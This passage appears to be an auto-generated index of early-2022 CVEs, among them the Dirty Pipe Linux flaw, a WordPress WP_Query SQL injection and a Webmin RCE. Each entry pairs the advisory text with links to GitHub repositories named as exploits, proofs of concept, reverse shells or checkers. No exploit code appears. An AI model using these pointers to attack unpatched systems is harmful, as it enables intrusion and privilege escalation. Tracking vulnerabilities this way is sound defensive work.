 WordPress is a free and open-source content management system written in PHP and paired with a MariaDB database. Due to improper sanitization in WP_Query, there can be cases where SQL injection is possible through plugins or themes that use it in a certain way. This has been patched in WordPress version 5.8.3. Older affected versions are also fixed via security release, that go back till 3.7.37. We strongly recommend that you keep auto-updates enabled. There are no known workarounds for this vulnerability.



- [https://github.com/purple-WL/wordpress-CVE-2022-21661](https://github.com/purple-WL/wordpress-CVE-2022-21661) :  ![starts](https://img.shields.io/github/stars/purple-WL/wordpress-CVE-2022-21661.svg) ![forks](https://img.shields.io/github/forks/purple-WL/wordpress-CVE-2022-21661.svg)

- [https://github.com/TAPESH-TEAM/CVE-2022-21661-WordPress-Core-5.8.2-WP_Query-SQL-Injection](https://github.com/TAPESH-TEAM/CVE-2022-21661-WordPress-Core-5.8.2-WP_Query-SQL-Injection) :  ![starts](https://img.shields.io/github/stars/TAPESH-TEAM/CVE-2022-21661-WordPress-Core-5.8.2-WP_Query-SQL-Injection.svg) ![forks](https://img.shields.io/github/forks/TAPESH-TEAM/CVE-2022-21661-WordPress-Core-5.8.2-WP_Query-SQL-Injection.svg)

## CVE-2022-21660
 Gin-vue-admin is a backstage management system based on vue and gin. In versions prior to 2.4.7 low privilege users are able to modify higher privilege users. Authentication is missing on the `setUserInfo` function. Users are advised to update as soon as possible. There are no known workarounds.



- [https://github.com/UzJu/Gin-Vue-admin-poc-CVE-2022-21660](https://github.com/UzJu/Gin-Vue-admin-poc-CVE-2022-21660) :  ![starts](https://img.shields.io/github/stars/UzJu/Gin-Vue-admin-poc-CVE-2022-21660.svg) ![forks](https://img.shields.io/github/forks/UzJu/Gin-Vue-admin-poc-CVE-2022-21660.svg)

- [https://github.com/UzJu/CVE-2022-21660](https://github.com/UzJu/CVE-2022-21660) :  ![starts](https://img.shields.io/github/stars/UzJu/CVE-2022-21660.svg) ![forks](https://img.shields.io/github/forks/UzJu/CVE-2022-21660.svg)

## CVE-2022-21658
 Rust is a multi-paradigm, general-purpose programming language designed for performance and safety, especially safe concurrency. The Rust Security Response WG was notified that the `std::fs::remove_dir_all` standard library function is vulnerable a race condition enabling symlink following (CWE-363). An attacker could use this security issue to trick a privileged program into deleting files and directories the attacker couldn't otherwise access or delete. Rust 1.0.0 through Rust 1.58.0 is affected by this vulnerability with 1.58.1 containing a patch. Note that the following build targets don't have usable APIs to properly mitigate the attack, and are thus still vulnerable even with a patched toolchain: macOS before version 10.10 (Yosemite) and REDOX. We recommend everyone to update to Rust 1.58.1 as soon as possible, especially people developing programs expected to run in privileged contexts (including system daemons and setuid binaries), as those have the highest risk of being affected by this. Note that adding checks in your codebase before calling remove_dir_all will not mitigate the vulnerability, as they would also be vulnerable to race conditions like remove_dir_all itself. The existing mitigation is working as intended outside of race conditions.



- [https://github.com/sagittarius-a/cve-2022-21658](https://github.com/sagittarius-a/cve-2022-21658) :  ![starts](https://img.shields.io/github/stars/sagittarius-a/cve-2022-21658.svg) ![forks](https://img.shields.io/github/forks/sagittarius-a/cve-2022-21658.svg)

## CVE-2022-21371
 Vulnerability in the Oracle WebLogic Server product of Oracle Fusion Middleware (component: Web Container). Supported versions that are affected are 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle WebLogic Server. Successful attacks of this vulnerability can result in unauthorized access to critical data or complete access to all Oracle WebLogic Server accessible data. CVSS 3.1 Base Score 7.5 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N).



- [https://github.com/Mr-xn/CVE-2022-21371](https://github.com/Mr-xn/CVE-2022-21371) :  ![starts](https://img.shields.io/github/stars/Mr-xn/CVE-2022-21371.svg) ![forks](https://img.shields.io/github/forks/Mr-xn/CVE-2022-21371.svg)

## CVE-2022-21241
 Cross-site scripting vulnerability in CSV+ prior to 0.8.1 allows a remote unauthenticated attacker to inject an arbitrary script or an arbitrary OS command via a specially crafted CSV file that contains HTML a tag.



- [https://github.com/satoki/csv-plus_vulnerability](https://github.com/satoki/csv-plus_vulnerability) :  ![starts](https://img.shields.io/github/stars/satoki/csv-plus_vulnerability.svg) ![forks](https://img.shields.io/github/forks/satoki/csv-plus_vulnerability.svg)

## CVE-2022-20699
 Multiple vulnerabilities in Cisco Small Business RV160, RV260, RV340, and RV345 Series Routers could allow an attacker to do any of the following: Execute arbitrary code Elevate privileges Execute arbitrary commands Bypass authentication and authorization protections Fetch and run unsigned software Cause denial of service (DoS) For more information about these vulnerabilities, see the Details section of this advisory.



- [https://github.com/Audiobahn/CVE-2022-20699](https://github.com/Audiobahn/CVE-2022-20699) :  ![starts](https://img.shields.io/github/stars/Audiobahn/CVE-2022-20699.svg) ![forks](https://img.shields.io/github/forks/Audiobahn/CVE-2022-20699.svg)

- [https://github.com/rohankumardubey/CVE-2022-20699](https://github.com/rohankumardubey/CVE-2022-20699) :  ![starts](https://img.shields.io/github/stars/rohankumardubey/CVE-2022-20699.svg) ![forks](https://img.shields.io/github/forks/rohankumardubey/CVE-2022-20699.svg)

## CVE-2022-0853
 A flaw was found in JBoss-client. The vulnerability occurs due to a memory leak on the JBoss client-side, when using UserTransaction repeatedly and leads to information leakage vulnerability.



- [https://github.com/ByteHackr/CVE-2022-0853](https://github.com/ByteHackr/CVE-2022-0853) :  ![starts](https://img.shields.io/github/stars/ByteHackr/CVE-2022-0853.svg) ![forks](https://img.shields.io/github/forks/ByteHackr/CVE-2022-0853.svg)

## CVE-2022-0848
 OS Command Injection in GitHub repository part-db/part-db prior to 0.5.11.



- [https://github.com/dskmehra/CVE-2022-0848](https://github.com/dskmehra/CVE-2022-0848) :  ![starts](https://img.shields.io/github/stars/dskmehra/CVE-2022-0848.svg) ![forks](https://img.shields.io/github/forks/dskmehra/CVE-2022-0848.svg)

## CVE-2022-0847
 A flaw was found in the way the &quot;flags&quot; member of the new pipe buffer structure was lacking proper initialization in copy_page_to_iter_pipe and push_pipe functions in the Linux kernel and could thus contain stale values. An unprivileged local user could use this flaw to write to pages in the page cache backed by read only files and as such escalate their privileges on the system.



- [https://github.com/liamg/traitor](https://github.com/liamg/traitor) :  ![starts](https://img.shields.io/github/stars/liamg/traitor.svg) ![forks](https://img.shields.io/github/forks/liamg/traitor.svg)

- [https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit](https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit) :  ![starts](https://img.shields.io/github/stars/Arinerron/CVE-2022-0847-DirtyPipe-Exploit.svg) ![forks](https://img.shields.io/github/forks/Arinerron/CVE-2022-0847-DirtyPipe-Exploit.svg)

- [https://github.com/Al1ex/LinuxEelvation](https://github.com/Al1ex/LinuxEelvation) :  ![starts](https://img.shields.io/github/stars/Al1ex/LinuxEelvation.svg) ![forks](https://img.shields.io/github/forks/Al1ex/LinuxEelvation.svg)

- [https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits) :  ![starts](https://img.shields.io/github/stars/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.svg) ![forks](https://img.shields.io/github/forks/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.svg)

- [https://github.com/imfiver/CVE-2022-0847](https://github.com/imfiver/CVE-2022-0847) :  ![starts](https://img.shields.io/github/stars/imfiver/CVE-2022-0847.svg) ![forks](https://img.shields.io/github/forks/imfiver/CVE-2022-0847.svg)

- [https://github.com/antx-code/CVE-2022-0847](https://github.com/antx-code/CVE-2022-0847) :  ![starts](https://img.shields.io/github/stars/antx-code/CVE-2022-0847.svg) ![forks](https://img.shields.io/github/forks/antx-code/CVE-2022-0847.svg)

- [https://github.com/bbaranoff/CVE-2022-0847](https://github.com/bbaranoff/CVE-2022-0847) :  ![starts](https://img.shields.io/github/stars/bbaranoff/CVE-2022-0847.svg) ![forks](https://img.shields.io/github/forks/bbaranoff/CVE-2022-0847.svg)

- [https://github.com/knqyf263/CVE-2022-0847](https://github.com/knqyf263/CVE-2022-0847) :  ![starts](https://img.shields.io/github/stars/knqyf263/CVE-2022-0847.svg) ![forks](https://img.shields.io/github/forks/knqyf263/CVE-2022-0847.svg)

- [https://github.com/febinrev/dirtypipez-exploit](https://github.com/febinrev/dirtypipez-exploit) :  ![starts](https://img.shields.io/github/stars/febinrev/dirtypipez-exploit.svg) ![forks](https://img.shields.io/github/forks/febinrev/dirtypipez-exploit.svg)

- [https://github.com/basharkey/CVE-2022-0847-dirty-pipe-checker](https://github.com/basharkey/CVE-2022-0847-dirty-pipe-checker) :  ![starts](https://img.shields.io/github/stars/basharkey/CVE-2022-0847-dirty-pipe-checker.svg) ![forks](https://img.shields.io/github/forks/basharkey/CVE-2022-0847-dirty-pipe-checker.svg)

- [https://github.com/Al1ex/CVE-2022-0847](https://github.com/Al1ex/CVE-2022-0847) :  ![starts](https://img.shields.io/github/stars/Al1ex/CVE-2022-0847.svg) ![forks](https://img.shields.io/github/forks/Al1ex/CVE-2022-0847.svg)

- [https://github.com/ahrixia/CVE_2022_0847](https://github.com/ahrixia/CVE_2022_0847) :  ![starts](https://img.shields.io/github/stars/ahrixia/CVE_2022_0847.svg) ![forks](https://img.shields.io/github/forks/ahrixia/CVE_2022_0847.svg)

- [https://github.com/xndpxs/CVE-2022-0847](https://github.com/xndpxs/CVE-2022-0847) :  ![starts](https://img.shields.io/github/stars/xndpxs/CVE-2022-0847.svg) ![forks](https://img.shields.io/github/forks/xndpxs/CVE-2022-0847.svg)

- [https://github.com/carlosevieira/Dirty-Pipe](https://github.com/carlosevieira/Dirty-Pipe) :  ![starts](https://img.shields.io/github/stars/carlosevieira/Dirty-Pipe.svg) ![forks](https://img.shields.io/github/forks/carlosevieira/Dirty-Pipe.svg)

- [https://github.com/Mustafa1986/CVE-2022-0847-DirtyPipe-Exploit](https://github.com/Mustafa1986/CVE-2022-0847-DirtyPipe-Exploit) :  ![starts](https://img.shields.io/github/stars/Mustafa1986/CVE-2022-0847-DirtyPipe-Exploit.svg) ![forks](https://img.shields.io/github/forks/Mustafa1986/CVE-2022-0847-DirtyPipe-Exploit.svg)

- [https://github.com/terabitSec/dirtyPipe-automaticRoot](https://github.com/terabitSec/dirtyPipe-automaticRoot) :  ![starts](https://img.shields.io/github/stars/terabitSec/dirtyPipe-automaticRoot.svg) ![forks](https://img.shields.io/github/forks/terabitSec/dirtyPipe-automaticRoot.svg)

- [https://github.com/rahul1406/cve-2022-0847dirtypipe-exploit](https://github.com/rahul1406/cve-2022-0847dirtypipe-exploit) :  ![starts](https://img.shields.io/github/stars/rahul1406/cve-2022-0847dirtypipe-exploit.svg) ![forks](https://img.shields.io/github/forks/rahul1406/cve-2022-0847dirtypipe-exploit.svg)

- [https://github.com/arttnba3/CVE-2022-0847](https://github.com/arttnba3/CVE-2022-0847) :  ![starts](https://img.shields.io/github/stars/arttnba3/CVE-2022-0847.svg) ![forks](https://img.shields.io/github/forks/arttnba3/CVE-2022-0847.svg)

- [https://github.com/Udyz/CVE-2022-0847](https://github.com/Udyz/CVE-2022-0847) :  ![starts](https://img.shields.io/github/stars/Udyz/CVE-2022-0847.svg) ![forks](https://img.shields.io/github/forks/Udyz/CVE-2022-0847.svg)

- [https://github.com/MrP1xel/CVE-2022-0847-dirty-pipe-kernel-checker](https://github.com/MrP1xel/CVE-2022-0847-dirty-pipe-kernel-checker) :  ![starts](https://img.shields.io/github/stars/MrP1xel/CVE-2022-0847-dirty-pipe-kernel-checker.svg) ![forks](https://img.shields.io/github/forks/MrP1xel/CVE-2022-0847-dirty-pipe-kernel-checker.svg)

- [https://github.com/0xIronGoat/dirty-pipe](https://github.com/0xIronGoat/dirty-pipe) :  ![starts](https://img.shields.io/github/stars/0xIronGoat/dirty-pipe.svg) ![forks](https://img.shields.io/github/forks/0xIronGoat/dirty-pipe.svg)

- [https://github.com/gyaansastra/CVE-2022-0847](https://github.com/gyaansastra/CVE-2022-0847) :  ![starts](https://img.shields.io/github/stars/gyaansastra/CVE-2022-0847.svg) ![forks](https://img.shields.io/github/forks/gyaansastra/CVE-2022-0847.svg)

- [https://github.com/CYB3RK1D/CVE-2022-0847-POC](https://github.com/CYB3RK1D/CVE-2022-0847-POC) :  ![starts](https://img.shields.io/github/stars/CYB3RK1D/CVE-2022-0847-POC.svg) ![forks](https://img.shields.io/github/forks/CYB3RK1D/CVE-2022-0847-POC.svg)

- [https://github.com/Shotokhan/cve_2022_0847_shellcode](https://github.com/Shotokhan/cve_2022_0847_shellcode) :  ![starts](https://img.shields.io/github/stars/Shotokhan/cve_2022_0847_shellcode.svg) ![forks](https://img.shields.io/github/forks/Shotokhan/cve_2022_0847_shellcode.svg)

- [https://github.com/chenaotian/CVE-2022-0847](https://github.com/chenaotian/CVE-2022-0847) :  ![starts](https://img.shields.io/github/stars/chenaotian/CVE-2022-0847.svg) ![forks](https://img.shields.io/github/forks/chenaotian/CVE-2022-0847.svg)

- [https://github.com/dadhee/CVE-2022-0847_DirtyPipeExploit](https://github.com/dadhee/CVE-2022-0847_DirtyPipeExploit) :  ![starts](https://img.shields.io/github/stars/dadhee/CVE-2022-0847_DirtyPipeExploit.svg) ![forks](https://img.shields.io/github/forks/dadhee/CVE-2022-0847_DirtyPipeExploit.svg)

- [https://github.com/breachnix/dirty-pipe-poc](https://github.com/breachnix/dirty-pipe-poc) :  ![starts](https://img.shields.io/github/stars/breachnix/dirty-pipe-poc.svg) ![forks](https://img.shields.io/github/forks/breachnix/dirty-pipe-poc.svg)

- [https://github.com/LudovicPatho/CVE-2022-0847](https://github.com/LudovicPatho/CVE-2022-0847) :  ![starts](https://img.shields.io/github/stars/LudovicPatho/CVE-2022-0847.svg) ![forks](https://img.shields.io/github/forks/LudovicPatho/CVE-2022-0847.svg)

- [https://github.com/realbatuhan/dirtypipetester](https://github.com/realbatuhan/dirtypipetester) :  ![starts](https://img.shields.io/github/stars/realbatuhan/dirtypipetester.svg) ![forks](https://img.shields.io/github/forks/realbatuhan/dirtypipetester.svg)

- [https://github.com/cspshivam/CVE-2022-0847-dirty-pipe-exploit](https://github.com/cspshivam/CVE-2022-0847-dirty-pipe-exploit) :  ![starts](https://img.shields.io/github/stars/cspshivam/CVE-2022-0847-dirty-pipe-exploit.svg) ![forks](https://img.shields.io/github/forks/cspshivam/CVE-2022-0847-dirty-pipe-exploit.svg)

- [https://github.com/ITMarcin2211/CVE-2022-0847-DirtyPipe-Exploit](https://github.com/ITMarcin2211/CVE-2022-0847-DirtyPipe-Exploit) :  ![starts](https://img.shields.io/github/stars/ITMarcin2211/CVE-2022-0847-DirtyPipe-Exploit.svg) ![forks](https://img.shields.io/github/forks/ITMarcin2211/CVE-2022-0847-DirtyPipe-Exploit.svg)

- [https://github.com/crusoe112/DirtyPipePython](https://github.com/crusoe112/DirtyPipePython) :  ![starts](https://img.shields.io/github/stars/crusoe112/DirtyPipePython.svg) ![forks](https://img.shields.io/github/forks/crusoe112/DirtyPipePython.svg)

- [https://github.com/4luc4rdr5290/CVE-2022-0847](https://github.com/4luc4rdr5290/CVE-2022-0847) :  ![starts](https://img.shields.io/github/stars/4luc4rdr5290/CVE-2022-0847.svg) ![forks](https://img.shields.io/github/forks/4luc4rdr5290/CVE-2022-0847.svg)

- [https://github.com/V0WKeep3r/CVE-2022-0847-DirtyPipe-Exploit](https://github.com/V0WKeep3r/CVE-2022-0847-DirtyPipe-Exploit) :  ![starts](https://img.shields.io/github/stars/V0WKeep3r/CVE-2022-0847-DirtyPipe-Exploit.svg) ![forks](https://img.shields.io/github/forks/V0WKeep3r/CVE-2022-0847-DirtyPipe-Exploit.svg)

- [https://github.com/edsonjt81/CVE-2022-0847-Linux](https://github.com/edsonjt81/CVE-2022-0847-Linux) :  ![starts](https://img.shields.io/github/stars/edsonjt81/CVE-2022-0847-Linux.svg) ![forks](https://img.shields.io/github/forks/edsonjt81/CVE-2022-0847-Linux.svg)

- [https://github.com/mrchucu1/CVE-2022-0847-Docker](https://github.com/mrchucu1/CVE-2022-0847-Docker) :  ![starts](https://img.shields.io/github/stars/mrchucu1/CVE-2022-0847-Docker.svg) ![forks](https://img.shields.io/github/forks/mrchucu1/CVE-2022-0847-Docker.svg)

- [https://github.com/pentestblogin/pentestblog-CVE-2022-0847](https://github.com/pentestblogin/pentestblog-CVE-2022-0847) :  ![starts](https://img.shields.io/github/stars/pentestblogin/pentestblog-CVE-2022-0847.svg) ![forks](https://img.shields.io/github/forks/pentestblogin/pentestblog-CVE-2022-0847.svg)

- [https://github.com/babyshen/CVE-2022-0847](https://github.com/babyshen/CVE-2022-0847) :  ![starts](https://img.shields.io/github/stars/babyshen/CVE-2022-0847.svg) ![forks](https://img.shields.io/github/forks/babyshen/CVE-2022-0847.svg)

- [https://github.com/puckiestyle/CVE-2022-0847](https://github.com/puckiestyle/CVE-2022-0847) :  ![starts](https://img.shields.io/github/stars/puckiestyle/CVE-2022-0847.svg) ![forks](https://img.shields.io/github/forks/puckiestyle/CVE-2022-0847.svg)

- [https://github.com/si1ent-le/CVE-2022-0847](https://github.com/si1ent-le/CVE-2022-0847) :  ![starts](https://img.shields.io/github/stars/si1ent-le/CVE-2022-0847.svg) ![forks](https://img.shields.io/github/forks/si1ent-le/CVE-2022-0847.svg)

- [https://github.com/lucksec/CVE-2022-0847](https://github.com/lucksec/CVE-2022-0847) :  ![starts](https://img.shields.io/github/stars/lucksec/CVE-2022-0847.svg) ![forks](https://img.shields.io/github/forks/lucksec/CVE-2022-0847.svg)

- [https://github.com/T4t4ru/CVE-2022-0847](https://github.com/T4t4ru/CVE-2022-0847) :  ![starts](https://img.shields.io/github/stars/T4t4ru/CVE-2022-0847.svg) ![forks](https://img.shields.io/github/forks/T4t4ru/CVE-2022-0847.svg)

- [https://github.com/2xYuan/CVE-2022-0847](https://github.com/2xYuan/CVE-2022-0847) :  ![starts](https://img.shields.io/github/stars/2xYuan/CVE-2022-0847.svg) ![forks](https://img.shields.io/github/forks/2xYuan/CVE-2022-0847.svg)

- [https://github.com/sa-infinity8888/Dirty-Pipe-CVE-2022-0847](https://github.com/sa-infinity8888/Dirty-Pipe-CVE-2022-0847) :  ![starts](https://img.shields.io/github/stars/sa-infinity8888/Dirty-Pipe-CVE-2022-0847.svg) ![forks](https://img.shields.io/github/forks/sa-infinity8888/Dirty-Pipe-CVE-2022-0847.svg)

- [https://github.com/githublihaha/DirtyPIPE-CVE-2022-0847](https://github.com/githublihaha/DirtyPIPE-CVE-2022-0847) :  ![starts](https://img.shields.io/github/stars/githublihaha/DirtyPIPE-CVE-2022-0847.svg) ![forks](https://img.shields.io/github/forks/githublihaha/DirtyPIPE-CVE-2022-0847.svg)

- [https://github.com/Greetdawn/CVE-2022-0847-DirtyPipe-](https://github.com/Greetdawn/CVE-2022-0847-DirtyPipe-) :  ![starts](https://img.shields.io/github/stars/Greetdawn/CVE-2022-0847-DirtyPipe-.svg) ![forks](https://img.shields.io/github/forks/Greetdawn/CVE-2022-0847-DirtyPipe-.svg)

- [https://github.com/Greetdawn/CVE-2022-0847-DirtyPipe](https://github.com/Greetdawn/CVE-2022-0847-DirtyPipe) :  ![starts](https://img.shields.io/github/stars/Greetdawn/CVE-2022-0847-DirtyPipe.svg) ![forks](https://img.shields.io/github/forks/Greetdawn/CVE-2022-0847-DirtyPipe.svg)

- [https://github.com/michaelklaan/CVE-2022-0847-Dirty-Pipe](https://github.com/michaelklaan/CVE-2022-0847-Dirty-Pipe) :  ![starts](https://img.shields.io/github/stars/michaelklaan/CVE-2022-0847-Dirty-Pipe.svg) ![forks](https://img.shields.io/github/forks/michaelklaan/CVE-2022-0847-Dirty-Pipe.svg)

- [https://github.com/AyoubNajim/cve-2022-0847dirtypipe-exploit](https://github.com/AyoubNajim/cve-2022-0847dirtypipe-exploit) :  ![starts](https://img.shields.io/github/stars/AyoubNajim/cve-2022-0847dirtypipe-exploit.svg) ![forks](https://img.shields.io/github/forks/AyoubNajim/cve-2022-0847dirtypipe-exploit.svg)

- [https://github.com/phuonguno98/CVE-2022-0847-DirtyPipe-Exploits](https://github.com/phuonguno98/CVE-2022-0847-DirtyPipe-Exploits) :  ![starts](https://img.shields.io/github/stars/phuonguno98/CVE-2022-0847-DirtyPipe-Exploits.svg) ![forks](https://img.shields.io/github/forks/phuonguno98/CVE-2022-0847-DirtyPipe-Exploits.svg)

- [https://github.com/LP-H4cmilo/CVE-2022-0847_DirtyPipe_Exploits](https://github.com/LP-H4cmilo/CVE-2022-0847_DirtyPipe_Exploits) :  ![starts](https://img.shields.io/github/stars/LP-H4cmilo/CVE-2022-0847_DirtyPipe_Exploits.svg) ![forks](https://img.shields.io/github/forks/LP-H4cmilo/CVE-2022-0847_DirtyPipe_Exploits.svg)

- [https://github.com/DanaEpp/pwncat_dirtypipe](https://github.com/DanaEpp/pwncat_dirtypipe) :  ![starts](https://img.shields.io/github/stars/DanaEpp/pwncat_dirtypipe.svg) ![forks](https://img.shields.io/github/forks/DanaEpp/pwncat_dirtypipe.svg)

- [https://github.com/nanaao/Dirtypipe-exploit](https://github.com/nanaao/Dirtypipe-exploit) :  ![starts](https://img.shields.io/github/stars/nanaao/Dirtypipe-exploit.svg) ![forks](https://img.shields.io/github/forks/nanaao/Dirtypipe-exploit.svg)

- [https://github.com/mutur4/Hacking-Scripts](https://github.com/mutur4/Hacking-Scripts) :  ![starts](https://img.shields.io/github/stars/mutur4/Hacking-Scripts.svg) ![forks](https://img.shields.io/github/forks/mutur4/Hacking-Scripts.svg)

## CVE-2022-0824
 Improper Access Control to Remote Code Execution in GitHub repository webmin/webmin prior to 1.990.



- [https://github.com/faisalfs10x/Webmin-CVE-2022-0824-revshell](https://github.com/faisalfs10x/Webmin-CVE-2022-0824-revshell) :  ![starts](https://img.shields.io/github/stars/faisalfs10x/Webmin-CVE-2022-0824-revshell.svg) ![forks](https://img.shields.io/github/forks/faisalfs10x/Webmin-CVE-2022-0824-revshell.svg)

## CVE-2022-0778
 The BN_mod_sqrt() function, which computes a modular square root, contains a bug that can cause it to loop forever for non-prime moduli. Internally this function is used when parsing certificates that contain elliptic curve public keys in compressed form or explicit elliptic curve parameters with a base point encoded in compressed form. It is possible to trigger the infinite loop by crafting a certificate that has invalid explicit curve parameters. Since certificate parsing happens prior to verification of the certificate signature, any process that parses an externally supplied certificate may thus be subject to a denial of service attack. The infinite loop can also be reached when parsing crafted private keys as they can contain explicit elliptic curve parameters. Thus vulnerable situations include: - TLS clients consuming server certificates - TLS servers consuming client certificates - Hosting providers taking certificates or private keys from customers - Certificate authorities parsing certification requests from subscribers - Anything else which parses ASN.1 elliptic curve parameters Also any other applications that use the BN_mod_sqrt() where the attacker can control the parameter values are vulnerable to this DoS issue. In the OpenSSL 1.0.2 version the public key is not parsed during initial parsing of the certificate which makes it slightly harder to trigger the infinite loop. However any operation which requires the public key from the certificate will trigger the infinite loop. In particular the attacker can use a self-signed certificate to trigger the loop during verification of the certificate signature. This issue affects OpenSSL versions 1.0.2, 1.1.1 and 3.0. It was addressed in the releases of 1.1.1n and 3.0.2 on the 15th March 2022. Fixed in OpenSSL 3.0.2 (Affected 3.0.0,3.0.1). Fixed in OpenSSL 1.1.1n (Affected 1.1.1-1.1.1m). Fixed in OpenSSL 1.0.2zd (Affected 1.0.2-1.0.2zc).



- [https://github.com/drago-96/CVE-2022-0778](https://github.com/drago-96/CVE-2022-0778) :  ![starts](https://img.shields.io/github/stars/drago-96/CVE-2022-0778.svg) ![forks](https://img.shields.io/github/forks/drago-96/CVE-2022-0778.svg)

- [https://github.com/BobTheShoplifter/CVE-2022-0778-POC](https://github.com/BobTheShoplifter/CVE-2022-0778-POC) :  ![starts](https://img.shields.io/github/stars/BobTheShoplifter/CVE-2022-0778-POC.svg) ![forks](https://img.shields.io/github/forks/BobTheShoplifter/CVE-2022-0778-POC.svg)

## CVE-2022-0725
 A flaw was found in KeePass. The vulnerability occurs due to logging the plain text passwords in the system log and leads to an Information Exposure vulnerability. This flaw allows an attacker to interact and read sensitive passwords and logs.



- [https://github.com/ByteHackr/keepass_poc](https://github.com/ByteHackr/keepass_poc) :  ![starts](https://img.shields.io/github/stars/ByteHackr/keepass_poc.svg) ![forks](https://img.shields.io/github/forks/ByteHackr/keepass_poc.svg)

## CVE-2022-0543
 It was discovered, that redis, a persistent key-value database, due to a packaging issue, is prone to a (Debian-specific) Lua sandbox escape, which could result in remote code execution.



- [https://github.com/aodsec/CVE-2022-0543](https://github.com/aodsec/CVE-2022-0543) :  ![starts](https://img.shields.io/github/stars/aodsec/CVE-2022-0543.svg) ![forks](https://img.shields.io/github/forks/aodsec/CVE-2022-0543.svg)

- [https://github.com/Newbee740/REDIS-CVE-2022-0543](https://github.com/Newbee740/REDIS-CVE-2022-0543) :  ![starts](https://img.shields.io/github/stars/Newbee740/REDIS-CVE-2022-0543.svg) ![forks](https://img.shields.io/github/forks/Newbee740/REDIS-CVE-2022-0543.svg)

## CVE-2022-0530
 A flaw was found in Unzip. The vulnerability occurs during the conversion of a wide string to a local string that leads to a heap of out-of-bound write. This flaw allows an attacker to input a specially crafted zip file, leading to a crash or code execution.



- [https://github.com/ByteHackr/unzip_poc](https://github.com/ByteHackr/unzip_poc) :  ![starts](https://img.shields.io/github/stars/ByteHackr/unzip_poc.svg) ![forks](https://img.shields.io/github/forks/ByteHackr/unzip_poc.svg)

- [https://github.com/nanaao/unzip_poc](https://github.com/nanaao/unzip_poc) :  ![starts](https://img.shields.io/github/stars/nanaao/unzip_poc.svg) ![forks](https://img.shields.io/github/forks/nanaao/unzip_poc.svg)

## CVE-2022-0529
 A flaw was found in Unzip. The vulnerability occurs during the conversion of a wide string to a local string that leads to a heap of out-of-bound write. This flaw allows an attacker to input a specially crafted zip file, leading to a crash or code execution.



- [https://github.com/ByteHackr/unzip_poc](https://github.com/ByteHackr/unzip_poc) :  ![starts](https://img.shields.io/github/stars/ByteHackr/unzip_poc.svg) ![forks](https://img.shields.io/github/forks/ByteHackr/unzip_poc.svg)

- [https://github.com/nanaao/unzip_poc](https://github.com/nanaao/unzip_poc) :  ![starts](https://img.shields.io/github/stars/nanaao/unzip_poc.svg) ![forks](https://img.shields.io/github/forks/nanaao/unzip_poc.svg)

## CVE-2022-0492
 A vulnerability was found in the Linux kernel&#8217;s cgroup_release_agent_write in the kernel/cgroup/cgroup-v1.c function. This flaw, under certain circumstances, allows the use of the cgroups v1 release_agent feature to escalate privileges and bypass the namespace isolation unexpectedly.



- [https://github.com/PaloAltoNetworks/can-ctr-escape-cve-2022-0492](https://github.com/PaloAltoNetworks/can-ctr-escape-cve-2022-0492) :  ![starts](https://img.shields.io/github/stars/PaloAltoNetworks/can-ctr-escape-cve-2022-0492.svg) ![forks](https://img.shields.io/github/forks/PaloAltoNetworks/can-ctr-escape-cve-2022-0492.svg)

- [https://github.com/SofianeHamlaoui/CVE-2022-0492-Checker](https://github.com/SofianeHamlaoui/CVE-2022-0492-Checker) :  ![starts](https://img.shields.io/github/stars/SofianeHamlaoui/CVE-2022-0492-Checker.svg) ![forks](https://img.shields.io/github/forks/SofianeHamlaoui/CVE-2022-0492-Checker.svg)

- [https://github.com/puckiestyle/CVE-2022-0492](https://github.com/puckiestyle/CVE-2022-0492) :  ![starts](https://img.shields.io/github/stars/puckiestyle/CVE-2022-0492.svg) ![forks](https://img.shields.io/github/forks/puckiestyle/CVE-2022-0492.svg)

- [https://github.com/chenaotian/CVE-2022-0492](https://github.com/chenaotian/CVE-2022-0492) :  ![starts](https://img.shields.io/github/stars/chenaotian/CVE-2022-0492.svg) ![forks](https://img.shields.io/github/forks/chenaotian/CVE-2022-0492.svg)

## CVE-2022-0487
 A use-after-free vulnerability was found in rtsx_usb_ms_drv_remove in drivers/memstick/host/rtsx_usb_ms.c in memstick in the Linux kernel. In this flaw, a local attacker with a user privilege may impact system Confidentiality. This flaw affects kernel versions prior to 5.14 rc1.



- [https://github.com/si1ent-le/CVE-2022-0847](https://github.com/si1ent-le/CVE-2022-0847) :  ![starts](https://img.shields.io/github/stars/si1ent-le/CVE-2022-0847.svg) ![forks](https://img.shields.io/github/forks/si1ent-le/CVE-2022-0847.svg)

## CVE-2022-0440
 The Catch Themes Demo Import WordPress plugin before 2.1.1 does not validate one of the file to be imported, which could allow high privivilege admin to upload an arbitrary PHP file and gain RCE even in the case of an hardened blog (ie DISALLOW_UNFILTERED_HTML, DISALLOW_FILE_EDIT and DISALLOW_FILE_MODS constants set to true)



- [https://github.com/qerogram/BUG_WEB](https://github.com/qerogram/BUG_WEB) :  ![starts](https://img.shields.io/github/stars/qerogram/BUG_WEB.svg) ![forks](https://img.shields.io/github/forks/qerogram/BUG_WEB.svg)

## CVE-2022-0420
 The RegistrationMagic WordPress plugin before 5.0.2.2 does not sanitise and escape the rm_form_id parameter before using it in a SQL statement in the Automation admin dashboard, allowing high privilege users to perform SQL injection attacks



- [https://github.com/qerogram/BUG_WEB](https://github.com/qerogram/BUG_WEB) :  ![starts](https://img.shields.io/github/stars/qerogram/BUG_WEB.svg) ![forks](https://img.shields.io/github/forks/qerogram/BUG_WEB.svg)

## CVE-2022-0337
 ** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.



